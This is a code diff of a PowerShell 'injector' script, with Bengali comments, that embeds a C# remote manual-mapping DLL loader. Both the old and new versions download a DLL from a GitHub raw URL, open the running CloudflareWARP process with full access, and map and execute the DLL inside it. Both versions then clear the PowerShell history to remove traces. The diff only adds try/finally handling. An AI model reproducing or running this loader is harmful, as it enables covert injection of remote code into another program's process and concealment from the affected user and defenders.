@@ -8,42 +8,37 @@ $DebugPreference        = 'SilentlyContinue'
 $InformationPreference  = 'SilentlyContinue'
 $WarningPreference      = 'SilentlyContinue'
 $ErrorActionPreference  = 'SilentlyContinue'
-$ConfirmPreference                 = 'None'
-$WhatIfPreference                  = $false
-$PSModuleAutoLoadingPreference     = 'None'
-$MaximumHistoryCount               = 0
+$ConfirmPreference      = 'None'
+$WhatIfPreference       = $false
+$PSModuleAutoLoadingPreference = 'None'
+$MaximumHistoryCount    = 0
 
 *> $null
 $Error.Clear()
 
-Write-Host "==========================================" -ForegroundColor Cyan
-Write-Host "   SysVenson CoreX Injector (Debug Mode)  " -ForegroundColor Cyan
-Write-Host "==========================================" -ForegroundColor Cyan
-Write-Host ""
+# ============================================================
+#  ★★★ পুরো স্ক্রিপ্টটিকে TRY/CATCH/FINALLY দিয়ে র্যাপ করা ★★★
+#  (যাতে যেকোনো অবস্থায় শেষে পজ করে উইন্ডো খোলা থাকে)
+# ============================================================
+try {
 
-# ============================================================
-#  ★★★ ১. অ্যাডমিন চেক ★★★
-# ============================================================
-Write-Host "[1] Checking Administrator privileges..." -ForegroundColor Yellow
-if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
-{
-    Write-Host "[ERROR] This script must be run as Administrator. Exiting." -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit
-}
-Write-Host "[SUCCESS] Running as Administrator." -ForegroundColor Green
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "   SysVenson CoreX Injector (Debug Mode)  " -ForegroundColor Cyan
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host ""
 
-# ============================================================
-#  ★★★ ২. কনসোল উইন্ডো হাইড করার অংশ পুরোপুরি বাদ দেওয়া হয়েছে ★★★
-#  (আপনি এখন কনসোল দেখতে পাবেন)
-# ============================================================
+    # --- অ্যাডমিন চেক ---
+    Write-Host "[1] Checking Administrator privileges..." -ForegroundColor Yellow
+    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+    if (-not $isAdmin) {
+        Write-Host "[ERROR] This script must be run as Administrator." -ForegroundColor Red
+        return  # return করলেও FINALLY ব্লক এক্সিকিউট হবে
+    }
+    Write-Host "[SUCCESS] Running as Administrator." -ForegroundColor Green
 
-# ============================================================
-#  ★★★ ৩. C# লোডার (রিমোট ম্যানুয়াল ম্যাপিং) ★★★
-# ============================================================
-Write-Host "[2] Compiling C# Remote Loader..." -ForegroundColor Yellow
-
-$kernel = @'
+    # --- C# লোডার কম্পাইল ---
+    Write-Host "[2] Compiling C# Remote Loader..." -ForegroundColor Yellow
+    $kernel = @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -61,7 +56,6 @@ public class ManualMapResult
 
 public static class RemoteLoader
 {
-    // ---- Windows API ----
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
 
@@ -98,7 +92,6 @@ public static class RemoteLoader
     [DllImport("kernel32.dll", SetLastError = true)]
     static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
 
-    // ---- Constants ----
     const uint MEM_COMMIT = 0x1000;
     const uint MEM_RESERVE = 0x2000;
     const uint MEM_RELEASE = 0x8000;
@@ -106,15 +99,11 @@ public static class RemoteLoader
     const uint PAGE_READWRITE = 0x04;
     const uint PAGE_EXECUTE_READ = 0x20;
     const uint PAGE_READONLY = 0x02;
-
     const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
 
-    // ---- Helper functions ----
     static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
     static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
     static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
-
-    static uint   RU32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); } // for local array
 
     static uint SProt(uint c) {
         bool x = (c & 0x20000000) != 0, w = (c & 0x80000000) != 0, r = (c & 0x40000000) != 0;
@@ -127,7 +116,6 @@ public static class RemoteLoader
 
     struct Sec { public uint VS, VA, SRD, PRD, Ch; }
 
-    // ---- Get module base address in remote process by name ----
     static IntPtr GetRemoteModuleBase(IntPtr hProcess, string moduleName) {
         uint needed = 0;
         IntPtr[] modules = new IntPtr[1024];
@@ -147,7 +135,6 @@ public static class RemoteLoader
         return IntPtr.Zero;
     }
 
-    // ---- Get exported function address from remote module ----
     static IntPtr GetRemoteProcAddress(IntPtr hProcess, IntPtr hModule, string funcName) {
         byte[] dosHeader = new byte[0x40];
         IntPtr bytesRead;
@@ -205,7 +192,6 @@ public static class RemoteLoader
         return Encoding.ASCII.GetString(buf, 0, len);
     }
 
-    // ---- Main remote manual mapping ----
     public static ManualMapResult MapRemote(byte[] dll, IntPtr hProcess, bool callEntry) {
         var res = new ManualMapResult();
 
@@ -363,93 +349,91 @@ public static class RemoteLoader
 }
 '@
 
-try {
-    Add-Type -TypeDefinition $kernel -ErrorAction Stop
-    Write-Host "[SUCCESS] C# Loader compiled successfully." -ForegroundColor Green
-} catch {
-    Write-Host "[ERROR] Failed to compile C# Loader: $_" -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-
-# ============================================================
-#  ★★★ ৪. ক্লাউডফ্লেয়ার WARP.exe প্রক্রিয়া খুঁজে ইনজেক্ট ★★★
-# ============================================================
-Write-Host "[3] Searching for target process 'CloudflareWARP'..." -ForegroundColor Yellow
-
-$targetProcessName = "CloudflareWARP"
-$proc = Get-Process -Name $targetProcessName -ErrorAction SilentlyContinue
-
-if (-not $proc) {
-    Write-Host "[ERROR] Process '$targetProcessName' not found! Please make sure Cloudflare WARP is running." -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-Write-Host "[SUCCESS] Process found. PID: $($proc.Id), Architecture: $($proc.StartInfo.EnvironmentVariables.PROCESSOR_ARCHITECTURE)" -ForegroundColor Green
-
-Write-Host "[4] Opening process handle with FULL access..." -ForegroundColor Yellow
-$hProcess = [RemoteLoader]::OpenProcess(0x1F0FFF, $false, $proc.Id)
-if ($hProcess -eq [IntPtr]::Zero) {
-    Write-Host "[ERROR] Failed to open process handle. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-Write-Host "[SUCCESS] Process handle opened: 0x$($hProcess.ToString('X'))" -ForegroundColor Green
-
-Write-Host "[5] Downloading DLL from GitHub..." -ForegroundColor Yellow
-try {
-    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
-    Write-Host "[SUCCESS] DLL downloaded. Size: $($bytes.Length) bytes" -ForegroundColor Green
-} catch {
-    Write-Host "[ERROR] Failed to download DLL: $_" -ForegroundColor Red
-    [RemoteLoader]::CloseHandle($hProcess)
-    Read-Host "Press Enter to exit"
-    exit 1
-}
-
-Write-Host "[6] Starting Remote Manual Mapping (Injecting)..." -ForegroundColor Yellow
-try {
-    $result = [RemoteLoader]::MapRemote($bytes, $hProcess, $true)
-    Write-Host "[SUCCESS] Injection completed successfully!" -ForegroundColor Green
-    Write-Host "        ImageBase: 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
-    Write-Host "        ImageSize: $($result.ImageSize) bytes" -ForegroundColor Green
-    Write-Host "        DllMain Address: 0x$($result.DllMainAddr.ToString('X'))" -ForegroundColor Green
-    Write-Host "        Is 64-bit: $($result.Is64Bit)" -ForegroundColor Green
-} catch {
-    Write-Host "[CRITICAL ERROR] Injection failed!" -ForegroundColor Red
-    Write-Host "        Error Message: $_" -ForegroundColor Red
-    if ($_.Exception.InnerException) {
-        Write-Host "        Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
+    try {
+        Add-Type -TypeDefinition $kernel -ErrorAction Stop
+        Write-Host "[SUCCESS] C# Loader compiled successfully." -ForegroundColor Green
+    } catch {
+        Write-Host "[ERROR] Failed to compile C# Loader: $_" -ForegroundColor Red
+        return  # return করলেও FINALLY ব্লক এক্সিকিউট হবে
     }
-    [RemoteLoader]::CloseHandle($hProcess)
-    Read-Host "Press Enter to exit"
-    exit 1
-}
 
-# ============================================================
-#  ★★★ ৫. ট্রেস ক্লিয়ার (সাইলেন্ট) ★★★
-# ============================================================
-Write-Host "[7] Clearing PowerShell history..." -ForegroundColor Yellow
-Clear-History
-$historyPath = (Get-PSReadlineOption).HistorySavePath
-if (Test-Path $historyPath) {
-    Clear-Content -Path $historyPath -Force
-    Write-Host "[SUCCESS] History cleared." -ForegroundColor Green
-}
+    # --- টার্গেট প্রক্রিয়া খোঁজা ---
+    Write-Host "[3] Searching for target process 'CloudflareWARP'..." -ForegroundColor Yellow
+    $targetProcessName = "CloudflareWARP"
+    $proc = Get-Process -Name $targetProcessName -ErrorAction SilentlyContinue
 
-$bytes = $null
-[GC]::Collect()
-[GC]::WaitForPendingFinalizers()
+    if (-not $proc) {
+        Write-Host "[ERROR] Process '$targetProcessName' not found! Please make sure Cloudflare WARP is running." -ForegroundColor Red
+        return
+    }
+    Write-Host "[SUCCESS] Process found. PID: $($proc.Id)" -ForegroundColor Green
 
-# ============================================================
-#  ★★★ ৬. ইনফিনিটি লুপ (উইন্ডো খোলা রাখতে) ★★★
-# ============================================================
-Write-Host "==========================================" -ForegroundColor Cyan
-Write-Host "[INFO] Injection process finished." -ForegroundColor Yellow
-Write-Host "[INFO] PowerShell window will stay open (Infinite sleep)." -ForegroundColor Yellow
-Write-Host "[INFO] Press CTRL + C to close this window manually." -ForegroundColor Yellow
-Write-Host "==========================================" -ForegroundColor Cyan
+    # --- প্রক্রিয়া হ্যান্ডেল খোলা ---
+    Write-Host "[4] Opening process handle with FULL access..." -ForegroundColor Yellow
+    $hProcess = [RemoteLoader]::OpenProcess(0x1F0FFF, $false, $proc.Id)
+    if ($hProcess -eq [IntPtr]::Zero) {
+        Write-Host "[ERROR] Failed to open process handle. Win32 Error: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())" -ForegroundColor Red
+        return
+    }
+    Write-Host "[SUCCESS] Process handle opened: 0x$($hProcess.ToString('X'))" -ForegroundColor Green
 
-while ($true) {
-    Start-Sleep -Seconds 86400
+    # --- DLL ডাউনলোড ---
+    Write-Host "[5] Downloading DLL from GitHub..." -ForegroundColor Yellow
+    try {
+        $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
+        Write-Host "[SUCCESS] DLL downloaded. Size: $($bytes.Length) bytes" -ForegroundColor Green
+    } catch {
+        Write-Host "[ERROR] Failed to download DLL: $_" -ForegroundColor Red
+        [RemoteLoader]::CloseHandle($hProcess)
+        return
+    }
+
+    # --- ইনজেকশন ---
+    Write-Host "[6] Starting Remote Manual Mapping (Injecting)..." -ForegroundColor Yellow
+    try {
+        $result = [RemoteLoader]::MapRemote($bytes, $hProcess, $true)
+        Write-Host "[SUCCESS] Injection completed successfully!" -ForegroundColor Green
+        Write-Host "        ImageBase: 0x$($result.ImageBase.ToString('X'))" -ForegroundColor Green
+        Write-Host "        ImageSize: $($result.ImageSize) bytes" -ForegroundColor Green
+        Write-Host "        DllMain Address: 0x$($result.DllMainAddr.ToString('X'))" -ForegroundColor Green
+        Write-Host "        Is 64-bit: $($result.Is64Bit)" -ForegroundColor Green
+    } catch {
+        Write-Host "[CRITICAL ERROR] Injection failed!" -ForegroundColor Red
+        Write-Host "        Error Message: $_" -ForegroundColor Red
+        if ($_.Exception.InnerException) {
+            Write-Host "        Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Red
+        }
+        [RemoteLoader]::CloseHandle($hProcess)
+        return
+    }
+
+    # --- ট্রেস ক্লিয়ার ---
+    Write-Host "[7] Clearing PowerShell history..." -ForegroundColor Yellow
+    Clear-History
+    $historyPath = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $historyPath) {
+        Clear-Content -Path $historyPath -Force
+        Write-Host "[SUCCESS] History cleared." -ForegroundColor Green
+    }
+
+    $bytes = $null
+    [GC]::Collect()
+    [GC]::WaitForPendingFinalizers()
+
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Write-Host "[INFO] All operations completed successfully!" -ForegroundColor Green
+    Write-Host "==========================================" -ForegroundColor Cyan
+
+} catch {
+    # যদি কোনো অপরিচিত ত্রুটি উপরের কোনো catch-এ ধরা না পড়ে, সেটা এখানে ধরা হবে
+    Write-Host "[UNHANDLED EXCEPTION] $_" -ForegroundColor Red
+    Write-Host $_.ScriptStackTrace -ForegroundColor DarkRed
+} finally {
+    # ★★★ এটাই ম্যাজিক! স্ক্রিপ্ট যেভাবেই শেষ হোক (সফল বা ত্রুটি), 
+    # এই অংশটি রান করবেই এবং এখানে পজ করে উইন্ডো খোলা রাখবে। ★★★
+    Write-Host "`n==========================================" -ForegroundColor Cyan
+    Write-Host "  PowerShell window will stay open until" -ForegroundColor Yellow
+    Write-Host "  you press ENTER below." -ForegroundColor Yellow
+    Write-Host "==========================================" -ForegroundColor Cyan
+    Read-Host "Press ENTER to close this window"
 }
